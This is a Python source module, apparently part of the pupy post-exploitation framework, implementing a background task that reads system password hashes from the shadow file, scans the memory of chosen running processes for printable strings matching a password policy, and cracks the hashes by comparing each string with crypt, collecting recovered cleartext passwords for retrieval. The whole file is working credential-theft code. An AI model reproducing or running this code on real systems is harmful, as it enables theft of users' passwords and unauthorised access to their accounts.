# -*- coding: utf-8 -*-

import memorpy
from spwd import getspall

import time
import re
import psutil
import pupy
import crypt

def start(names, hashes=[], poll=20, minpw=8, maxpw=16, maxdups=131072, policy=True):
    if pupy.manager.active(HashMon):
        return False

    try:
        pupy.manager.create(
            HashMon,
            names, hashes=hashes, poll=poll, minpw=minpw,
            maxpw=maxpw, maxdups=maxdups, policy=policy
        )
    except:
        return False

    return True

def dump():
    mon = pupy.manager.get(HashMon)
    if mon:
        return mon.results

def stop():
    mon = pupy.manager.get(HashMon)
    if mon:
        pupy.manager.stop(HashMon)
        return mon.results

class HashMon(pupy.Task):
    def __init__(self, manager, names=[], hashes=[], poll=60, minpw=8, maxpw=16, maxdups=131072, policy=True):
        super(HashMon, self).__init__(manager)
        self.pids = {}
        self.hashes = set(hashes)
        self.found = set()
        self.autoupdate = not hashes
        self.names = [
            re.compile(x) for x in set(names)
        ]
        self.printable = re.compile('^[\x20-\x7e]{{{},{}}}$'.format(minpw, maxpw))
        self.duplicates = set()
        self.maxdups = maxdups
        self.policy = policy
        self.last_pids = frozenset()

        if self.policy is not None:
            if type(self.policy) in (str, unicode):
                self.policy = re.compile(self.policy)
            elif self.policy is True:
                # Default - 1 digit, alpha, symbol, 8-16 symbols
                self.policy = re.compile(
                    r"^(?=.*\d)(?=.*[a-zA-Z])(?=.*[&^*!@#$%])[0-9a-zA-Z!@#$%*^&]{{{},{}}}$".format(
                        minpw, maxpw))
        self.poll = poll

    def update_hashes(self):
        if not self.autoupdate:
            return

        hashes = [
            x.sp_pwd for x in getspall() if not x.sp_pwd.startswith(('!', '*'))
        ]

        for h in hashes:
            if h not in self.found:
                self.hashes.add(h)
                for string in self.duplicates:
                    ctext, hash = self.check_hash(h, string)
                    if ctext:
                        self.append((ctext, hash))
                        self.hashes.remove(h)

    def get_pid_strings(self, pid):
        try:
            mw = memorpy.MemWorker(pid=pid)
            matcher = self.policy or self.printable
            for _, (cstring,) in mw.mem_search('([\x20-\x7e]+)\x00', ftype='groups', optimizations='ixrs'):
                if matcher.match(cstring):
                    if cstring not in self.duplicates:
                        yield cstring

                        if len(self.duplicates) > self.maxdups:
                            self.duplicates = set()

                        self.duplicates.add(cstring)
        except:
            pass

    def get_new_pids(self):
        if not self.need_poll():
            return

        for process in psutil.process_iter():
            info = process.as_dict(['create_time', 'pid', 'name', 'exe'])
            pid = info['pid']
            if pid not in self.pids or self.pids[pid] == info['create_time']:
                for name in self.names:
                    if name.match(info['name']) or name.match(info['exe']):
                        yield pid
                        self.pids[pid] = info['create_time']

    def get_new_strings(self):
        for pid in self.get_new_pids():
            for string in self.get_pid_strings(pid):
                yield string

    def check_hash(self, hash, string):
        if hash.startswith('$'):
            salt = hash.rsplit('$', 1)[0]
        else:
            salt = hash[:2]

        if crypt.crypt(string, salt) == hash:
            return string, hash
        else:
            return None, None

    def check_hashes(self, string):
        for hash in self.hashes.copy():
            ctext, hash = self.check_hash(hash, string)
            if ctext is not None:
                yield ctext, hash
                self.found.add(hash)
                self.hashes.remove(hash)

    def get_new_passwords(self):
        for string in self.get_new_strings():
            for pair in self.check_hashes(string):
                yield pair

    def need_poll(self):
        current_pids = frozenset(psutil.pids())
        if current_pids == self.last_pids:
            return False
        else:
            self.last_pids = current_pids
            return True

    def task(self):
        while self.active:
            if self.autoupdate:
                self.update_hashes()

            if self.hashes:
                for string, hash in self.get_new_passwords():
                    self.append((string, hash))

            time.sleep(self.poll)
